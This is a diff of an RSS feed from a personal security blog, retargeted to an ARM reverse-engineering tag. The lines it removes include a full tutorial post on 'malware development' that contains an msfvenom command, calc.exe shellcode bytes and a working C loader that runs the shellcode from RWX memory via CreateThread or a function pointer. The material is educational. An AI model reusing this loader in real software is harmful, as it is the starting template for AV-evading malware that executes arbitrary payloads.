@@ -1,12 +1,12 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>IamAlch3mist blogs</title>
-    <link>https://IamAlch3mist.github.io/</link>
-    <description>Recent content on IamAlch3mist blogs</description>
+    <title>ARM reverse engineering on IamAlch3mist blogs</title>
+    <link>https://IamAlch3mist.github.io/tags/arm-reverse-engineering/</link>
+    <description>Recent content in ARM reverse engineering on IamAlch3mist blogs</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 15 Jun 2024 01:10:42 +0530</lastBuildDate><atom:link href="https://IamAlch3mist.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 15 Jun 2024 01:10:42 +0530</lastBuildDate><atom:link href="https://IamAlch3mist.github.io/tags/arm-reverse-engineering/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>nRF51 readback protection (RBPCONF) bypass</title>
       <link>https://IamAlch3mist.github.io/posts/nrf51_code_readout_bypass/</link>
@@ -156,145 +156,6 @@ Exploitation section.&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://infocenter.nordicsemi.com/pdf/nRF51_RM_v3.0.1.pdf?cp=6_2_0&#34;&gt;https://infocenter.nordicsemi.com/pdf/nRF51_RM_v3.0.1.pdf?cp=6_2_0&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.pentestpartners.com/security-blog/nrf51822-code-readout-protection-bypass-a-how-to/&#34;&gt;https://www.pentestpartners.com/security-blog/nrf51822-code-readout-protection-bypass-a-how-to/&lt;/a&gt;&lt;/p&gt;
 </content>
-    </item>
-    
-    <item>
-      <title>Introduction to shellcode execution</title>
-      <link>https://IamAlch3mist.github.io/posts/into_to_shellcode_exec/</link>
-      <pubDate>Sun, 12 May 2024 17:50:19 +0530</pubDate>
-      
-      <guid>https://IamAlch3mist.github.io/posts/into_to_shellcode_exec/</guid>
-      <description>Introduction Hey, everyone in this short blog post I’m going to discuss about shellcode execution in windows environment. I know there are a lot of blogs about this topic available online, lately I started learning windows internals and malware development &amp;amp; exploitation on windows platform so I’m writing this blogs to document my process for my own future references. In this blog I’m not going to show any crazy EDR/Anti-virus or AMSI bypass techniques, rather I’m covering the foundational knowledge required to get started in malware development.</description>
-      <content>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
-&lt;p&gt;Hey, everyone in this short blog post I’m going to discuss about shellcode execution in windows environment. I know there are a lot of blogs about this topic available online, lately I started learning windows internals and malware development &amp;amp; exploitation on windows platform so I’m writing this blogs to document my process for my own future references. In this blog I’m not going to show any crazy EDR/Anti-virus or AMSI bypass techniques, rather I’m covering the foundational knowledge required to get started in malware development.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Disclaimer: 
-Malware development is illegal. 
-This blog post is for educational purposes only to understand how malware works. 
-I am not responsible for any illegal activity resulting from the information provided.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In upcoming modules I’ll cover more advanced malware development concepts to bypass AV/EDR solutions. I’m planning to write it as a series of blog posts, so lets get started. If you are a red teamer, exploit developer, malware analyst or simply you want to understand how malware works, this blog post is for you.&lt;/p&gt;
-&lt;h1 id=&#34;what-is-a-shellcode&#34;&gt;What is a shellcode?&lt;/h1&gt;
-&lt;p&gt;Shellcode is a small piece of assembly code used to exploit a software vulnerability, malware also uses this shellcode to do malicious actions which can be connecting back to a C2, providing reverse shell to attacker or exploiting additional software vulnerabilities for higher privileges. In this blog post we’ll execute a simple calc shellcode which spawns calc.exe program.&lt;/p&gt;
-&lt;p&gt;I’m using metasploit to create shellcode. Using the below command we will generate the shellcode in a format that we can use it in our malware.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msfvenom -p windows/x64/exec CMD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;calc.exe&amp;#39;&lt;/span&gt; -f c
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://IamAlch3mist.github.io/img/intro_to_shellcode_exec/1.png&#34; alt=&#34;shellcode generate&#34;&gt;&lt;/p&gt;
-&lt;p&gt;I’ll be using C to write the malware, you can use the language which is suitable for you (go, .net, nim, etc).&lt;/p&gt;
-&lt;h1 id=&#34;method-1-shellcode-execution-as-a-thread&#34;&gt;Method 1: Shellcode Execution as a Thread&lt;/h1&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
-&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;()
-{
-	LPVOID ptr_address;
-	&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; shellcode[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
-
-
-	ptr_address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; VirtualAlloc(NULL, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(shellcode), MEM_COMMIT &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	RtlMoveMemory(ptr_address, shellcode, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(shellcode));
-	CreateThread(NULL, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, (LPTHREAD_START_ROUTINE)ptr_address, NULL, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
-	getchar();
-	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lets breakdown the code. &lt;strong&gt;ptr_address&lt;/strong&gt; is a PVOID data type in windows, which is basically void pointer equivalent to &lt;strong&gt;void *ptr_address&lt;/strong&gt;. Next our shellcode is declared as a variable named shellcode.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;VirtualAlloc&lt;/strong&gt; function allocates the requested memory space dynamically in calling process virtual memory which returns a pointer. &lt;strong&gt;MEM_COMMIT | MEM_RESERVE&lt;/strong&gt; is used to reserve and commit pages in one step. Check MSDN documentation to learn more.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;PAGE_EXECUTE_READWRITE&lt;/strong&gt; set’s the allocated memory pages permission to RWX, which is required to execute shellcode in memory, alternatively we can use VirtualProtect function to change the permission of the page. By default windows enables DEP (Data Execution Prevention) which prevents us from executing shellcode, so to bypass this restriction we are allocating the memory pages as RWX.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;RtlMoveMemory&lt;/strong&gt; function moves the content of shellcode variable to newly allocated buffer. Basically it’s windows version of memcpy.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;CreateThread&lt;/strong&gt; function starts a thread in calling process virtual memory. 3rd parameter to the function is the pointer to be executed. In our case the newly allocated buffer which holds our shellcode.&lt;/p&gt;
-&lt;p&gt;Compile the above code using visual studio. Build the project and start executing it, it will spawn the calc.exe process. We can use this base template to test our shellcodes in upcoming blogs.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://IamAlch3mist.github.io/img/intro_to_shellcode_exec/2.png&#34; alt=&#34;shellcode execution&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;method-2-as-function-pointer&#34;&gt;Method 2: as function pointer&lt;/h1&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;	ptr_address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; VirtualAlloc(NULL, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(shellcode), MEM_COMMIT &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	memcpy(ptr_address, shellcode, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(shellcode));
-	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fn_ptr)();
-	fn_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)()) (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)ptr_address;
-	(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;) (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fn_ptr)();
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can execute shellcode as a function pointer as well, you might’ve seen similar code in shellcode tester programs, we are also doing the same. Using memcpy function copied the shellcode to newly allocated buffer.&lt;/p&gt;
-&lt;p&gt;Then declaring a function pointer named &lt;strong&gt;fn_ptr&lt;/strong&gt;. Then the allocated buffer is type casted to the function pointer type. After that we are executing the function &lt;strong&gt;fn_ptr&lt;/strong&gt; indicates as a function pointer. Sounds little confusing right? so let’s look at the assembly equivalent of the program.&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;I’m Ghidra user but for this example I’m using IDA freeware to disassemble the binary&lt;/em&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://IamAlch3mist.github.io/img/intro_to_shellcode_exec/3.png&#34; alt=&#34;shellcode reversing&#34;&gt;&lt;/p&gt;
-&lt;p&gt;In the first block we can see a call to VirtualAlloc function, before the function call the required parameters for the function is placed in the appropriated registers (rcx, rdx, r8, r9), the return address stored in rax register is being moved into r8 register after the call to VirtualAlloc. Then in the next block a call is made to r8 register which is pointing to our shellcode. call is just an unconditional branch instruction so whatever is pointed by r8 register gets executed (In our case our shellcode). In between there is no changes in r8 register.&lt;/p&gt;
-&lt;p&gt;In assembly it looks a lot simpler than C source code.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Note for this example I&#39;ve disabled windows defender 
-otherwise defender will detect it as malicious executable and removes it
-&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;references&#34;&gt;references&lt;/h1&gt;
-&lt;p&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc&#34;&gt;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread&#34;&gt;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect&#34;&gt;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect&lt;/a&gt;&lt;/p&gt;
-</content>
-    </item>
-    
-    <item>
-      <title>IoT binary analysis &amp; emulation part -1</title>
-      <link>https://IamAlch3mist.github.io/posts/binary_emulation_pt1/</link>
-      <pubDate>Sat, 07 Oct 2023 21:10:21 +0530</pubDate>
-      
-      <guid>https://IamAlch3mist.github.io/posts/binary_emulation_pt1/</guid>
-      <description>https://hacklido.com/blog/529-iot-binary-analysis-emulation-part-1</description>
-      <content>&lt;p&gt;&lt;a href=&#34;https://hacklido.com/blog/529-iot-binary-analysis-emulation-part-1&#34;&gt;https://hacklido.com/blog/529-iot-binary-analysis-emulation-part-1&lt;/a&gt;&lt;/p&gt;
-</content>
-    </item>
-    
-    <item>
-      <title>Firmware extraction from SPI flash</title>
-      <link>https://IamAlch3mist.github.io/posts/firmware_extraction_spi/</link>
-      <pubDate>Sat, 07 Oct 2023 21:09:09 +0530</pubDate>
-      
-      <guid>https://IamAlch3mist.github.io/posts/firmware_extraction_spi/</guid>
-      <description>https://hacklido.com/blog/379-firmware-extraction-from-spi-flash</description>
-      <content>&lt;p&gt;&lt;a href=&#34;https://hacklido.com/blog/379-firmware-extraction-from-spi-flash&#34;&gt;https://hacklido.com/blog/379-firmware-extraction-from-spi-flash&lt;/a&gt;&lt;/p&gt;
-</content>
-    </item>
-    
-    <item>
-      <title>Payatu hiring CTF creds writeup</title>
-      <link>https://IamAlch3mist.github.io/posts/creds_writeup/</link>
-      <pubDate>Sat, 07 Oct 2023 21:08:00 +0530</pubDate>
-      
-      <guid>https://IamAlch3mist.github.io/posts/creds_writeup/</guid>
-      <description>https://hacklido.com/blog/121-payatu-hiring-ctf-creds-writeup</description>
-      <content>&lt;p&gt;&lt;a href=&#34;https://hacklido.com/blog/121-payatu-hiring-ctf-creds-writeup&#34;&gt;https://hacklido.com/blog/121-payatu-hiring-ctf-creds-writeup&lt;/a&gt;&lt;/p&gt;
-</content>
-    </item>
-    
-    <item>
-      <title>Hardware Hacking : Getting UART Shells</title>
-      <link>https://IamAlch3mist.github.io/posts/uart_shell/</link>
-      <pubDate>Sat, 07 Oct 2023 21:06:55 +0530</pubDate>
-      
-      <guid>https://IamAlch3mist.github.io/posts/uart_shell/</guid>
-      <description>https://hacklido.com/blog/22-hardware-hacking-getting-uart-shells</description>
-      <content>&lt;p&gt;&lt;a href=&#34;https://hacklido.com/blog/22-hardware-hacking-getting-uart-shells&#34;&gt;https://hacklido.com/blog/22-hardware-hacking-getting-uart-shells&lt;/a&gt;&lt;/p&gt;
-</content>
-    </item>
-    
-    <item>
-      <title>Hello world</title>
-      <link>https://IamAlch3mist.github.io/posts/helloworld/</link>
-      <pubDate>Sat, 07 Oct 2023 20:42:01 +0530</pubDate>
-      
-      <guid>https://IamAlch3mist.github.io/posts/helloworld/</guid>
-      <description>hello world! </description>
-      <content>&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;hello world!
-&lt;/code&gt;&lt;/pre&gt;</content>
     </item>
     
   </channel>
